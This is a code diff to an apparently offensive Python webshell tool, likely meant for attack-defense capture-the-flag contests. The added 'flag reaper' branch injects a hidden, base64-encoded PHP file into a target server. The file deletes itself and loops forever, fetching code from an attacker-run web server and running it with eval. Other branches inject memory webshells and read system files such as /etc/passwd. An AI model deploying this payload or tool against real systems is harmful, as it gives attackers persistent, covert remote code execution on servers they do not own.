@@ -147,6 +147,20 @@ def main():
             webshell.auto_inject_memery_webshell(filename, password)
         elif context == "fr":
             Log.info("Starting flag reaper...")
+            webserver_host = raw_input("[IP] (%s) : " % (get_ip_address())) or get_ip_address()
+            webserver_port = int(raw_input("[PORT] (80) : ") or "80")
+            filename = ".%s.php" % (random_string(0x10, string.letters))
+            file_content = "ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);while(true){$code = file_get_contents('http://%s:%d/code.txt');eval($code);sleep(5);}" % (webserver_host, webserver_port)
+            Log.info("Temp memory phpfile : %s" % (file_content))
+            Log.info("Encoding phpfile...")
+            file_content = '<?php eval(base64_decode("%s"));?>' % (file_content.encode("base64").replace("\n", ""))
+            Log.info("Final memory phpfile : %s" % (file_content))
+            result = webshell.auto_inject_flag_reaper(filename, file_content)
+            if result:
+                Log.success("Please check the web server(%s:%d) log to get your flag!" % (webserver_host, webserver_port))
+                Log.info("Tips : tail -f /var/log/apache2/access.log")
+            else:
+                Log.error("Starting flag reaper failed!")
         elif context == "r" or context == "read":
             filepath = raw_input("Input file path (/etc/passwd) : ") or "/etc/passwd"
             webshell.read_file(filepath)
